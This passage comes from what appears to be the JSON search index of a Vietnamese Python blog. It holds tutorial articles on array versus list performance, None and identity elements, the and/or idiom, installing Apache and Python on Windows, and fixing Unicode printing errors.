hay boolean. Ví dụ: >>> from array import array >>> array ( 'I' , range ( 10 )) array('I', [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]) >>> array . array ( 'u' , \"hello\" ) array('u', 'hello') Ví dụ 1 khai báo một mảng (hay array) các số nguyên unsiged int chứa các giá trị từ 0 đến 9. 'I' gọi là type code - một giá trị quy định kiểu của mỗi item trong mảng. Đoạn mã phía sau đó khai báo một array của các ký tự unicode. Dưới đây là danh sách các type code được hỗ trợ trong Python 3.1: Type code C Type Python Type Minimum size in bytes b signed char int 1 B unsigned char int 1 u Py_UNICODE Unicode character 2 h signed short int 2 H unsigned short int 2 i signed int int 2 I unsigned int int 2 l signed long int 4 L unsigned long int 4 f float float 4 d double float 8 Như trong tài liệu Python viết. Kích thước thực sự của một số type code như 'i', 'I', 'l', 'L' phụ thuộc vào kiến trúc máy tính triển khai python (thông thường là sự khác biệt giữa kiến trúc 32 bit và 64 bit - xem thêm: Integer - computer science ). Kiểu của mỗi phần tử trong mảng chính xác là kiểu của ngôn ngữ C tương ứng trong bảng, vì vậy kích thước của mảng luôn có thể xác định chính xác. Điều này khác với list. Khi nhận được một list rất khó để xác định chính xác kích thước bộ nhớ của nó. Module array có các hàm buffer_info() và itemsize cho phép thực hiện điều này. Hàm buffer_info() cho kết quả một tuple chứa địa chỉ bộ nhớ và số phần tử của mảng. Hàm itemsize cho biết kích thước của mỗi phần tử theo byte. Để tính kích thước bộ nhớ mà python cấp phát cho mảng dùng biểu thức: x.buffer_info()[1] * x.itemsize . Ví dụ: >>> x = array . array ( 'u' , \"python\" ) >>> x . itemsize 2 >>> x . buffer_info () (29756264, 6) >>> x . buffer_info ()[ 1 ] * x . itemsize 12 Các mảng quy định rõ kiểu giá trị nó chứa, vì vậy không thể lưu các giá trị vượt phạm vi cho phép hoặc các giá trị không đúng kiểu. Python báo lỗi khi xảy ra sự kiện này: >>> array . array ( \"L\" , [ 2 ** 32 ]) Traceback (most recent call last): File \"<interactive input>\" , line 1 , in <module> OverflowError : python int too large to convert to C unsigned long >>> array ( 'I' , []) array('I') >>> array ( 'I' , [ None ]) Traceback (most recent call last): File \"<interactive input>\" , line 1 , in <module> TypeError : an integer is required Trong python 3.* type code 'c' không còn được sử dụng do từ Python 3.0 trở đi kiểu dữ liệu string luôn luôn là unicode. >>> array ( 'c' , [ 'a' ]) Traceback (most recent call last): File \"<interactive input>\" , line 1 , in <module> ValueError : bad typecode (must be b, B, u, h, H, i, I, l, L, f or d) Type code 'u' cũng sẽ khác nhau về kích thước trên các hệ điều hành khác nhau, khi chúng triển khai UCS2 (2 byte) hoặc UCS4 (4 byte). Để biết máy bạn dùng UCS mấy gõ lệnh sau: >>> import sys >>> sys . maxunicode 65535 Đó là UCS2, trên hệ thống mà Python được compile với UCS4 kết quả phải lớn hơn. Module array có hầu hết các phương thức tương tự list : >>> dir ( array ( 'd' , [])) ['__add__', '__class__', '__contains__', '__copy__', '__deepcopy__', '__delattr__', '__delitem__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmul__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'buffer_info', 'byteswap', 'count', 'extend', 'fromfile', 'fromlist', 'fromstring', 'fromunicode', 'index', 'insert', 'itemsize', 'pop', 'remove', 'reverse', 'tofile', 'tolist', 'tostring', 'tounicode', 'typecode'] Trong danh sách trên ta thấy array không có phương thức sort giống như list . Để sắp xếp các array, bạn có thể dùng hàm sorted . Hàm sorted là hàm built-in, khác với list.sort nó tạo ra list mới và không thay đổi list gốc. >>> from array import array >>> example = array ( 'd' , [ math . pi , math . e , math . log ( 10 )]) >>> sorted ( example ) [2.302585092994046, 2.718281828459045, 3.141592653589793] >>> sorted ( example , reverse = True ) [3.141592653589793, 2.718281828459045, 2.302585092994046] 2. \"Efficient arrays\" nhanh hơn list như nào? Trong phần này chúng ta sẽ thực hiện một số kiểm tra performance giữa array và list trên một số thao tác điển hình. Chỉ một số thao tác được kiểm tra, kết quả thời gian có thể khác nhau với các phiên bản Python, hay các cấu hình máy khác. Tuy nhiên tôi cố gắng đặt các kiểm tra trong cùng một tập các điều kiện thí nghiệm, và chỉ xem xét tương quan giữa các con số nhằm rút ra một kết luận nào đó. Đầu tiên là sắp xếp - thao tác cơ bản đặc trưng cho một list. >>> from timeit import Timer >>> Timer ( \"a.sort()\" , \"import random;a=list(range(10**4)); \\ ... random.shuffle(a)\" ) . timeit ( 100 ) 0.05681145858943637 >>> Timer ( \"sorted(a)\" , \"import random;a=list(range(10**4)); \\ ... random.shuffle(a)\" ) . timeit ( 100 ) 0.7554756694498792 >>> Timer ( \"sorted(a)\" , \"import random,array;a=array.array('L', range(10**4)); \\ ... random.shuffle(a)\" ) . timeit ( 100 ) 0.8100354453472391 Ví dụ trên so sánh thời gian thực hiện của list.sort, sorted trên list, và sorted trên array khi sắp xếp mảng số nguyên 32 bit có 10 ngàn item. Chúng ta thấy thậm chí việc sắp xếp trên mảng bằng hàm sorted chậm hơn nhiều so với trên list.sort trong trường hợp này. Test này được thực hiện trên Python 3.1 với máy Pentium Dual Core 1.7MHz. Trên các phiên bản Python 2.x bạn chỉ cần viết a = range(10**4) thay vì a = list(range(10**4)) Tiếp tục khảo sát với số phần tử đến 100 ngàn, 1 triệu, 10 triệu phần tử: >>> Timer ( \"a.sort()\" , \"import random;a=range(10**5);random.shuffle(a)\" ) . timeit ( 100 ) 1.0628812891800408 >>> Timer ( \"sorted(a)\" , \"import random;a=range(10**5);random.shuffle(a)\" ) . timeit ( 100 ) 13.890136599318794 >>> Timer ( \"sorted(a)\" , \"import random,array;a=array.array('L', range(10**5)); \\ ... random.shuffle(a)\" ) . timeit ( 100 ) 14.082001048258462 >>> Timer ( \"a.sort()\" , \"import random;a=range(10**6);random.shuffle(a)\" ) . timeit ( 1 ) 1.8611051722955381 >>> Timer ( \"sorted(a)\" , \"import random;a=range(10**6);random.shuffle(a)\" ) . timeit ( 1 ) 1.9412927927796773 >>> Timer ( \"sorted(a)\" , \"import random,array;a=array.array('L', range(10**6)); \\ ... random.shuffle(a)\" ) . timeit ( 1 ) 2.2266062190747107 >>> Timer ( \"a.sort()\" , \"import random;a=range(10**7);random.shuffle(a)\" ) . timeit ( 1 ) 25.894550537010218 >>> Timer ( \"sorted(a)\" , \"import random;a=range(10**7);random.shuffle(a)\" ) . timeit ( 1 ) 26.986440155994387 >>> Timer ( \"sorted(a)\" , \"import random,array;a=array.array('L', range(10**7)); \\ ... random.shuffle(a)\" ) . timeit ( 1 ) 30.602503383151088 Hàm sort của list là in-place vì vậy nó nhanh hơn sorted do không phải thực hiện các thao tác cấp phát bộ nhớ để tạo list mới như sorted . Nó nhanh hơn đáng kể khi số phần tử là nhỏ. Trong test trên đây là khoảng 13 lần với 10 ngàn item và 100 ngàn item. Số các thao tác cấp phát bộ nhớ tăng tuyến tính theo số phần tử, trong khi số các phép so sánh tăng theo n*logn (hoặc nếu tốt hơn n*loglogn). Vì vậy khi tăng số lượng các item thì số các phép so sánh tăng nhanh hơn số các thao tác cấp phát bộ nhớ. Ở trên 1 triệu phần tử các phép toán so sánh chiếm đa số thời gian xử lý. Ta có thể thấy thời gian thực thi ở các hàm là tương đương nhau. Trên mức 10 triệu phần tử sự khác biệt không còn đáng kể nữa. Hàm sorted thực thi trên array thường sẽ chậm hơn trên list trong sai khác thời gian tương đối nhỏ. Nguyên nhân có thể được giải thích là do sorted không tạo ra một array mà luôn luôn tạo ra một list. Rõ ràng sorted trên một array nhưng trả lại list sẽ chậm hơn khi sorted trên list trả lại list. Các Efficient arrays muốn nhanh hơn list thực sự cần một sort của riêng chúng. Chuyển qua các thao tác khác với list. Chẳng hạn với hàm sum một list các số nguyên >>> Timer ( \"sum(x)\" , \"x=range(1000)\" ) . timeit ( 10000 ) 0.60629310370359235 >>> Timer ( \"sum(x)\" , \"import array; x = array.array('d', range(1000))\" ) . timeit ( 10000 ) 0.74805731663627739 >>> Timer ( \"sum(x)\" , \"x=range(10000)\" ) . timeit ( 1000 ) 0.60768722812650822 >>> Timer ( \"sum(x)\" , \"import array; x = array.array('d', range(10000))\" ) . timeit ( 1000 ) 0.75720026176844613 >>> Timer ( \"sum(x)\" , \"x=range(10**5)\" ) . timeit ( 100 ) 1.1360591999478515 >>> Timer ( \"sum(x)\" , \"import array; x = array.array('d', range(10**5))\" ) . timeit ( 100 ) 0.73434230670147826 >>> Timer ( \"sum(x)\" , \"x=range(10**6)\" ) . timeit ( 10 ) 1.9724225132735 >>> Timer ( \"sum(x)\" , \"import array; x = array.array('d', range(10**6))\" ) . timeit ( 10 ) 0.73678350503251977 >>> Timer ( \"sum(x)\" , \"x=range(10**7)\" ) . timeit ( 10 ) 20.701364808722474 >>> Timer ( \"sum(x)\" , \"import array; x = array.array('d', range(10**7))\" ) . timeit ( 10 ) 7.399070781130149 Hàm sum với array chậm hơn khi số phần tử nhỏ và càng ngày càng nhanh hơn khi số phần tử lớn hơn. Test sau đây cũng chỉ ra join các string là nhanh hơn hàm tounicode của array. >>> array ( 'u' , map ( chr , range ( 65 , 90 ))) . tounicode () 'ABCDEFGHIJKLMNOPQRSTUVWXY' >>> \"\" . join ( map ( chr , range ( 65 , 90 ))) 'ABCDEFGHIJKLMNOPQRSTUVWXY' >>> Timer ( \"array.array('u', map(chr, range(65, 90))).tounicode()\" , \"import array\" ) . timeit () 14.721977927611988 >>> Timer ( \"''.join(map(chr, range(65, 90)))\" , \"\" ) . timeit () 8.788942485645748 Để loại bỏ các phần tử trùng nhau của một list từ python 2.4 trở đi bạn có thể dùng lệnh L = list(set(L)) . Ví dụ: >>> list ( set ([ 5 , 5 , 1 , 2 , 3 , 2 , 3 ])) [1, 2, 3, 5] >>> array ( 'L' , set ([ 1 , 2 , 3 , 1 , 2 , 3 ])) array('L', [1, 2, 3]) Ví dụ sau so sánh thời gian loại trùng của array và list sử dụng cú pháp này: >>> Timer ( \"array('L', set(x))\" , \"from array import array; \\ ... x = array('L', range(10**5))\" ) . timeit ( 10 ) 0.3053085107321749 >>> Timer ( \"list(set(x))\" , \"x = range(10**5)\" ) . timeit ( 10 ) 0.25598173543039593 >>> Timer ( \"array('L', set(x))\" , \"from array import array; \\ ... x = array('L', range(10**6))\" ) . timeit ( 10 ) 3.901955860623275 >>> Timer ( \"list(set(x))\" , \"x = range(10**6)\" ) . timeit ( 10 ) 2.275834090902208 >>> Timer ( \"array('L', set(x))\" , \"from array import array; \\ ... x = array('L', range(10**7))\" ) . timeit ( 1 ) 3.823739795026995 >>> Timer ( \"list(set(x))\" , \"x = range(10**7)\" ) . timeit ( 1 ) 2.216846163641094 Như vậy sử dụng array sẽ không hiệu quả bằng list trong tình huống này. Việc đảo ngược một list cũng luôn luôn nhanh hơn đảo ngược một array. Ví dụ: >>> Timer ( \"x.reverse()\" , \"x = range(10**7)\" ) . timeit ( 10 ) 0.30343171366575916 >>> Timer ( \"x.reverse()\" , \"import array; x = array.array('L', range(10**7))\" ) . timeit ( 10 ) 4.0138636612646224 Trên python 3.* bạn phải viết x = list(range(10**7)) do hàm range trong python 3.* trả về iterator chứ không phải list. Với phép toán nhân list lại chậm hơn array. Ví dụ: >>> Timer ( \"100000*x\" , \"from array import array; \\ ... x=array('u', u'hello world')\" ) . timeit ( 10 ) 0.077855393644313153 >>> Timer ( \"100000*x\" , \"x=list(u'hello world')\" ) . timeit ( 10 ) 0.20222266310884152 Dùng array sẽ kỳ hiệu quả hơn trong phép cộng: >>> Timer ( \"x + y\" , \"from array import array; \\ ... x=array('L', range(10*7));y=x[:]\" ) . timeit ( 100 ) 0.00019484576660033781 >>> Timer ( \"x + y\" , \"x=range(10*7);y=x[:]\" ) . timeit ( 100 ) 0.0005318282637745142 >>> Timer ( \"x + y\" , \"from array import array; \\ ... x=array('L', range(1000));y=x[:]\" ) . timeit () 2.354171564954413 >>> Timer ( \"x + y\" , \"x=range(1000);y=x[:]\" ) . timeit () 20.363064586337714 Như vậy là không phải lúc nào array cũng nhanh hơn list. Ít nhất là trong thao tác đảo ngược mảng và sắp xếp. Trong hầu hết các tính toán với danh sách kích thước nhỏ, dùng list sẽ tiện và nhanh hơn.","tags":"Bài viết","title":"\"Efficient arrays\" có nhanh hơn list?"},{"url":"2010/01/pygments-12-voi-kieu-monokai.html","text":"Ngày 01 tháng 01 năm 2010 (ngày đầu năm mới 2010), Georg Brandl đã công bố phiên bản 1.2, tên gọi Neujahr của gói Pygments. Pygments là thư viện làm sáng cú pháp (syntax highlighter) tổng quát, và được sử dụng để tô điểm cho các phần mã nguồn ở chính trang PCNV này. Người dùng có thể tải Pygments từ http://pypi.python.org/pypi/Pygments , hoặc xem qua một số ví dụ tại http://pygments.org/demo . Phiên bản 1.2 không còn tương thích với Python 2.3, có hỗ trợ thêm một số cú pháp mới, và đặc biệt là thêm vào kiểu màu Monokai như các bạn có thể thấy tại trang PCNV.","tags":"Tin tức","title":"Pygments 1.2 với kiểu Monokai"},{"url":"2010/01/andor.html","text":"Trong bài viết trước về Phần tử không tôi có nói về việc cần phải cẩn thận khi dùng phép toán có tương tác giữa phần tử không và None . Trong bài này tôi trình bày một ví dụ nhỏ minh họa rõ hơn một vấn đề mà nhiều bạn mới học có thể gặp phải. Đó là phép toán rút gọn ..and..or.. khi có sự tham gia của None . Cấu trúc if.. else và phép gán giá trị theo điều kiện trong python: if condition : x = somevalue else : x = othervalue Có thể được viết trên một dòng: x = condition and somevalue or othervalue Ví dụ: >>> x = 1 + 1 * 2 == 3 and \"OK\" or \"DUREX\" >>> x 'OK' Thực tế có nhiều bạn thích cách viết này. Vì nó gọn hơn và mang tính python hơn. Tuy nhiên hãy cẩn thận khi sử dụng cấu trúc này. Chẳng hạn trong cấu trúc: x = condition and func1 () or func2 () Hàm func1() và func2() có thể có giá trị None , khi đó kết quả kỳ vọng có thể không như bạn mong muốn. Xét ví dụ: def func1 (): return None def func2 (): return \"some value\" x = 1 + 1 == 2 and func1 () or func2 () print x Kết quả: some value Biểu thức logic là True song vì func1() == None nên x = True and None or func2() = \"some value\" Vì vậy hãy cẩn thận khi dùng cấu trúc ..and..or.. trừ khi bạn biết rõ các giá trị tham gia biểu thức này luôn luôn khác None . Từ phiên bản 2.5 trở đi Python hỗ trợ cấu trúc: x = TrueValue if Condition else FalseValue Ví dụ: x = \"OK\" if 1 + 1 == 2 else \"DUREX\"","tags":"Bài viết","title":"..and..or.."},{"url":"2010/01/lap-trinh-web-voi-python-2.html","text":"Cài đặt Python Sau khi cài đặt máy chủ web Apache, chúng ta cần cài đặt trình thông dịch Python. Chúng ta sẽ sử dụng phiên bản 2.6.4 trong chuỗi bài viết này. Bộ cài đặt Python 2.6.4 có thể được tải về từ https://www.python.org/download/ . Khi thực thi phần cài đặt, chúng ta sẽ gặp một hộp thoại như sau: Chọn Install for all users và nhấn nút Next để tiếp tới hình chụp sau: Nếu bạn muốn cài đặt vào nơi khác thì chọn đường dẫn, nếu không thì chúng ta sẽ sử dụng đường dẫn mặc định C:Python26 . Nhấn nút Next để tiếp tục. Chúng ta sẽ nhấn tiếp Next ở hộp thoại này để bắt đầu quá trình cài đặt các phần thông dụng như trình thông dịch, tài liệu, ví dụ... Hộp thoại trên cho chúng ta biết quá trình cài đặt đang diễn ra. Khi kết thúc, chúng ta chỉ cần nhấn nút Finish . Để kiểm tra Python có được cài vào máy chưa thì chúng ta sẽ cần mở màn hình dấu nhắc lệnh (command prompt) bằng cách nhấn vào nút Start và nhập cmd.exe sau đó gõ phím Enter như bình bên dưới. Chúng ta sẽ nhận được một cửa sổ dòng lệnh. Nhập vào cửa sổ dòng lệnh c:Python26python.exe thì chúng ta sẽ thấy rằng trình thông dịch Python được thực thi, và nó hiện ra một dấu nhắc tương tác (interactive prompt) như trong hình sau: Ngay tại đây chúng ta có thể nhập một câu lệnh Python print 'web programming in python' . Câu lệnh này sẽ được thực hiện và kết quả là chúng ta sẽ nhận được chuỗi web programming in python in ra trên màn hình như hình sau: Để thoát khỏi trình thông dịch Python, chúng ta sẽ nhập vào dòng lệnh quit() . Để thoát khỏi dấu nhắc dòng lệnh thì chúng ta nhập tiếp lệnh exit . Như vậy, chúng ta đã thật sự hoàn tất việc cài đặt trình thông dịch Python. Nếu bạn có nhu cầu tìm hiểu thêm về ngôn ngữ và các thư viện đi kèm thì bài chỉ dẫn Python 2.5 bằng tiếng Việt có lẽ sẽ giúp ích nhiều cho bạn. Chúng ta sẽ sẵn sàng cho chương trình web đầu tiên trong bài viết sau! Hẹn gặp lại và chúc mừng năm mới.","tags":"Bài viết","title":"Lập trình web với Python (2)"},{"url":"2009/12/phan-tu-khong-trong-python.html","text":"Bài viết này nêu lên một số khía cạnh thú vị (nhưng cũng rắc rối) của kiểu dữ liệu None cùng các phép toán liên quan đến nó, qua đó giúp các bạn mới học hiểu sâu sắc hơn về các kiểu dữ liệu có trong Python. Bài viết này có sử dụng một số khái niệm có trong lý thuyết nhóm chỉ nhằm mục đích minh họa những ý đồ của người viết. 1. Khái niệm phần tử không Trong lý thuyết nhóm có khái niệm về phần tử không hay phần tử trung hòa . Phần tử không θ của một tập S trên phép toán * là phần tử thỏa mãn: a*θ = θ*a = a với mọi a trên S . Các kiểu dữ liệu cơ bản trong Python cũng có phần tử không như vậy. Xem bảng tổng kết sau: Kiểu dữ liệu Phép toán Phần tử không Ví dụ Số nguyên + 0 0 + 69 = 69 + 0 Số thực + 0.0 0.0 + 96.0 = 96.0 + 0.0 Danh sách +, extend [] [1] + [] = [] + [1] = [1] tuple + () (1,) + () = () + (1,) = (1,) Tập hợp union set([]) set([1]).union(set([])) = set([]).union(set([1])) = set([1]) Chuỗi + \"\" \"abc\" + \"\" = \"\" + \"abc\" = \"abc\" Từ điển update {} {1:1}.update({}) = {}.update({1:1}) = {1:1} Số phức + 0 + 0j Logic or False False or True = True or False = True 2. None và các toán tử logic None là một tập hợp đặc biệt, chỉ có chính nó, mà cũng không phải là chính nó. Không phải là chính nó vì None bao hàm ý nghĩa là thiếu giá trị (denoting lack of value): >>> type ( None ) <type 'NoneType'> None tương tác với tất cả các phần tử không: >>> assert (([] and None ) == []) >>> assert (({} and None ) == {}) >>> assert (( 0.0 and None ) == 0.0 ) >>> assert (( \"\" and None ) == \"\" ) >>> assert (( set ([]) and None ) == set ([])) >>> assert ((() and None ) == ()) >>> assert (( 0j and None ) == 0 J ) >>> assert (( False and None ) == False ) Nếu ta gọi S là tập hợp các phần tử không, bao gồm chính None , thì với phép toán and , None chính là phần tử không bên phải của S . Ai bảo None không phải là giá trị. Tuy nhiên: >>> assert (( None and []) == None ) >>> assert (( None and {}) == None ) >>> assert (( None and set ([])) == None ) >>> assert (( None and \"\" ) == None ) >>> assert (( None and 0 ) == None ) Tương tự: >>> assert (( None or set ([])) == set ([])) >>> assert (( None or []) == []) >>> assert (( None or {}) == {}) >>> assert (( None or \"\" ) == \"\" ) >>> assert (( None or 0 ) == 0 ) >>> assert (( None or 0j ) == 0j ) >>> assert (( None or ()) == ()) Nghĩa là None là phần tử không bên phải đối với tập S nói trên trong phép toán or . Và: >>> assert (({} or None ) is None ) >>> assert (([] or None ) is None ) >>> assert (( 0 or None ) is None ) >>> assert (( set ([]) or None ) is None ) >>> assert (( \"\" or None ) is None ) >>> assert (( 0j or None ) is None ) >>> assert ((() or None ) is None ) >>> assert (( 0.0 or None ) is None ) Như vậy khi None tương tác với các phần tử không, thứ tự các toán hạng là điều bạn cần chú ý. Phép toán or giữa None và object bất kỳ không phải là phần tử không là ánh xạ đồng nhất bất kể thứ tự phép toán: >>> set ([ 'a' ]) or None set(['a']) >>> None or set ([ 'a' ]) set(['a']) >>> None or \"abc\" 'abc' >>> \"abc\" or None 'abc' >>> None or { 1 : 1 } {1: 1} >>> { 1 : 1 } or None {1: 1} Phép toán and thì luôn cho kết quả None với bất kỳ phần tử nào không phải là phần tử không, không kể thứ tự toán hạng: >>> assert (( None and 1 ) is None ) >>> assert (( 1 and None ) is None ) >>> assert (([ 1 ] and None ) is None ) >>> assert (( None and [ 1 ]) is None ) >>> assert (( \"abc\" and None ) is None ) >>> assert (( None and \"abc\" ) is None ) Một biểu thức logic chứa None có thể trả về None , nghĩa là không có giá trị. Điều này làm cho None trong python trở lên phức tạp và không giống với null trong C# hay nothing trong VB.NET. Trong VB.NET một biểu thức logic luôn luôn trả về giá trị logic. None là tận cùng (bottom), là nhỏ hơn tất cả. >>> None < 0.0 == 0 < {} < [ 1 ] < \"\" < () True None không có bất kỳ một method nào, thậm chí chính nó là một method khi được dùng với filter hoặc map (xem phần dưới). Cuối cùng None là None - đừng băn khoăn (&#94;-&#94;): >>> None is None True >>> None == None True Việc hiểu rõ bản chất của None cùng các tương tác của nó với các phần tử không qua các phép toán logic là RẤT quan trọng khi bạn viết các lệnh if , filter ... Một hàm bất kỳ có thể trả về None nếu bạn viết return None , hoặc không return ở bất kỳ chỗ nào trong hàm. Một hàm như vậy khi tham gia vào biểu thức logic sẽ tạo ra những hiệu ứng mà bạn cần phải nắm rõ bản chất. 3. Loại bỏ các phần tử không trong danh sách Nói chung các phần tử không sẽ không có ý nghĩa khi nó nằm trong danh sách. Một trong những cách để loại bỏ phần tử không là dùng filter . filter cùng với hàm func sẽ loại bỏ tất cả các phần tử trong danh sách mà tác động của hàm func lên phần tử này tạo ra phần tử không. Diễn giải dễ hiểu của nó như sau: filter(func, list) tương đương với S = [0, 0.0, [], (), {}, set([]), \"\", 0j, False] def filter(func, list): return [x for x in list if func(x) not in S] Ví dụ: >>> filter ( lambda x : not x , [ 3 , 4 , False , True , { 1 : 0 }, []]) [False, []] Để loại bỏ các phần tử không trong danh sách L , đơn giản là bạn dùng hàm ánh xạ đồng nhất f(x) = x ví dụ như filter(lambda x: x, L) . Hàm này tương đương với: def filter(func, list): return [x for x in list if x not in S] Cuối cùng một cách viết gây khó hiểu là thay thế lambda x: x bằng hàm None . filter(None, list) # <==> filter(lambda x: x, list) Ví dụ: >>> filter ( None , [ 0 , 0.0 , \"\" , 0 + 0j , set ([]), (), [], {}, False ]) [] >>> filter ( None , [ \"\" , \"abc\" , \" \" ]) ['abc', ' '] >>> filter ( None , [ 1 , 0 , 2 , 0.0 ]) [1, 2] Ở đây chúng ta có cảm giác như None được dùng như một hàm. Thực ra không phải vậy, None có nghĩa là không có hàm nào ở đây cả, nói cách khác đối số đầu tiên của filter bị khuyết. Python lúc đó sẽ dùng hàm mặc định gì đó tương tự như lambda x: x . 4. Dùng None với map >>> map ( None , [ 1 , 2 , { 1 : 2 }]) [1, 2, {1: 2}] map không thay đổi danh sách khi nó bị khuyết hàm tác động. Khi đó hàm None tương đương với ánh xạ đồng nhất (mặc dù không chính xác, vì thực ra là không có hàm nào cả, Python có thể đã sử dụng hàm mặc định). Tuy nhiên dùng hàm None khi có hai danh sách trở lên thì lại tạo ra khả năng đặc biệt . >>> map ( None , [ 1 , 2 ], [ 3 , 4 ]) [(1, 3), (2, 4)] >>> map ( None , [ 1 , 2 ], [ 3 , 4 ], [ 5 , 6 ]) [(1, 3, 5), (2, 4, 6)] Khả năng này tương đương với zip . >>> zip ([ 1 , 2 ], [ 3 , 4 ], [ 5 , 6 ]) [(1, 3, 5), (2, 4, 6)] >>> zip ([ 1 , 2 ], [ 3 , 4 ]) [(1, 3), (2, 4)] Diễn giải của nó như sau: >>> map ( lambda x , y : ( x , y ), [ 1 , 2 ], [ 3 , 4 ]) [(1, 3), (2, 4)] >>> map ( lambda x , y , z : ( x , y , z ), [ 1 , 2 ], [ 3 , 4 ], [ 5 , 6 ]) [(1, 3, 5), (2, 4, 6)] Một lần nữa trong mục này, mặc dù None bao hàm ý nghĩa về sự khuyết giá trị, song trong triển khai của hàm bất kỳ việc khuyết giá trị dẫn đến việc sử dụng các hàm mặc định. Lúc đó None có ý nghĩa là những gì mặc định. Đôi khi có thể ngắn gọn coi nó cũng là một hàm đặc biệt, hàm None . Chú ý quan trọng: Các test của bài viết này được thử trên python 2.5.x .","tags":"Bài viết","title":"Phần tử không trong Python"},{"url":"2009/12/lap-trinh-web-voi-python-1.html","text":"Trong loạt bài lập trình web với Python, tôi sẽ hướng dẫn bạn đọc những thao tác cơ bản từ việc cài đặt, cấu hình, cho đến lập trình, hoàn thành một ứng dụng web đơn giản. Qua quá trình đó, bạn đọc sẽ được giới thiệu về kỹ thuật CGI, đến FastCGI và cuối cùng là WSGI. Cài đặt máy chủ web Apache Để lập trình web, chúng ta cần một máy chủ phục vụ web. Máy chủ Apache HTTP là một trong những phần mềm máy chủ web phổ dụng trên Internet. Chúng ta sẽ cần tải bản cài đặt phần mềm này về. Tôi sẽ sử dụng phiên bản 2.2.14 ( apache_2.2.14-win32-x86-openssl-0.9.8k.msi ) cho các bài viết trong loạt bài này. Hệ điều hành tôi đang sử dụng là Windows 7. Khi chạy tập tin cài đặt, chúng ta sẽ gặp giao diện như sau: Nhấn vào nút Next để qua màn hình kế: Chọn ô đầu tiên để đồng ý với cam kết bản quyền, và nhấn nút Next để qua trang kế: Tiếp tục nhấn nút Next : Điền thông tin vào các ô trống như trong hình ví dụ, và nhấn Next : Chọn kiểu cài đặt Typical và nhấn nút Next : Nếu bạn muốn thay đổi đường dẫn cài đặt thì bạn sẽ chỉnh trong trang này, còn không thì nhấn nút Next : Nhấn nút Install để bắt đầu quá trình cài đặt: Chúng ta sẽ được thông báo về quá trình cài đặt. Sau khi cài đặt hoàn thành, nhấn Finish để kết thúc: Nhấn vào nút Start và nhập vào services.msc như hình trên để kiểm tra sự tồn tại của máy chủ web Apache2: Như hình trên, dịch vụ Apache2 đã được chạy (started). Để kiểm tra thì chúng ta sẽ mở Internet Explorer (IE) lên và truy cập vào địa chỉ http://localhost . Nếu bạn nhận được kết quả như hình bên dưới đây thì bạn đã hoàn thành việc cài đặt máy chủ web Apache rồi đó. Trong bài tới chúng ta sẽ tiếp tục thực hiện việc cài đặt Python.","tags":"Bài viết","title":"Lập trình web với Python (1)"},{"url":"2009/12/in-chuoi-unicode-ra-man-hinh.html","text":"Một ngày nào đấy, có lẽ bạn sẽ rất bực mình khi gặp phải một lỗi tương tự như sau: c:\\tmp> c : \\Python26\\python.exe helloworld.py Traceback (most recent call last): File \"helloworld.py\", line 3, in <module> print u\"Xin ch├áo bß║ín, Python!\" File \"c:\\Python26\\lib\\encodings\\cp437.py\", line 12, in encode return codecs.charmap_encode(input,errors,encoding_map) UnicodeEncodeError: 'charmap' codec can't encode character u'\\u1ea1' in position 10: character maps to <undefined> Mã nguồn của helloworld.py chỉ đơn giản như sau: # -*- encoding: utf-8 -*- print u \"Xin chào bạn, Python!\" Lỗi này xảy ra vì chúng ta đang in một chuỗi unicode, với các ký tự nằm ngoài bảng mã ASCII (hoặc bảng mã mặc định của màn hình hiện tại). Khi gặp phải các ký tự nằm ngoài bảng mã này, Python mặc định sẽ nâng một biệt lệ cho biết chính xác đó là ký tự nào, nằm ở vị trí nào. Như ví dụ trên, đó là ký tự ạ có mã unicode là 1EA1 nằm tại vị trí thứ 10 (vị trí bắt đầu là 0) trong chuỗi Xin chào bạn, Python! . Có một số cách để khắc phục lỗi này, từ việc thay đổi một số biến môi trường, cho đến việc sửa từng dòng lệnh. Tất cả đều nhằm một mục đích là chuyển chuỗi unicode cần in thành chuỗi byte theo bảng mã UTF-8. Thay đổi biến môi trường: Biến môi trường PYTHONIOENCODING được dùng để định nghĩa bảng mã cho các bộ nhập chuẩn, bộ xuất chuẩn, và bộ lỗi chuẩn (stdin, stdout, stderr). Chúng ta có thể định nghĩa biến môi trường này thành utf-8 như sau: c:\\tmp> set PYTHONIOENCODING = utf-8 c:\\tmp> c : \\Python26\\python.exe helloworld.py Xin ch├áo bß║ín, Python! Thay đổi bộ xuất chuẩn: Bộ xuất chuẩn ( sys.stdout ) có thể được \"gói\" trong bảng mã mới thông qua mô-đun codecs . # -*- encoding: utf-8 -*- import codecs import sys writer_factory = codecs . getwriter ( \"utf-8\" ) sys . stdout = writer_factory ( sys . stdout ) print u \"Xin chào bạn, Python!\" c:\\tmp> c : \\Python26\\python helloworld.py Xin ch├áo bß║ín, Python! Thay đổi từng dòng lệnh print : # -*- encoding: utf-8 -*- print u \"Xin chào bạn, Python!\" . encode ( \"utf-8\" ) c:\\tmp> c : \\Python26\\python helloworld.py Xin ch├áo bß║ín, Python! Như chúng ta thấy, cách nào cũng dẫn đến cùng một kết quả mong muốn. Việc áp dụng cách nào sẽ phụ thuộc vào hoàn cảnh của từng chương trình.","tags":"Bài viết","title":"In chuỗi unicode ra màn hình"},{"url":"2009/12/cac-ban-cai-dat-implementation-cua-python.html","text":"Có lẽ với nhiều người, khi nhắc tới Python sẽ chỉ nghĩ đến trình thông dịch được tải về từ trang web chính thức của ngôn ngữ này: https://www.python.org . Thế nhưng để đến với ngôn ngữ lập trình Python thì không chỉ có \"con đường\" đó. Là một chuẩn ngôn ngữ lập trình, Python có rất nhiều bản cài đặt khác nhau, với những mục tiêu cũng như những điểm mạnh, yếu khác nhau. Bài viết này sẽ giới thiệu một trong số những bản cài đặt đó, mong rằng nó sẽ hữu ích đối với những người muốn sử dụng Python nhưng vì một lí do nào đó mà không sử dụng được trình thông dịch chuẩn. 1- CPython Phiên bản mới nhất: 2.6 và 3.1 Đây chính là trình thông dịch chuẩn của Python, được coi là bản cài đặt tham chiếu cho ngôn ngữ này. Được viết bằng C và thực thi mã thông qua một trình thông dịch mã trung gian (bytecode interpreter). Là bản cài đặt chính thức, CPython có những tính năng mới nhất của Python, tuy nhiên bị hạn chế về một số mặt như tốc độ. 2- 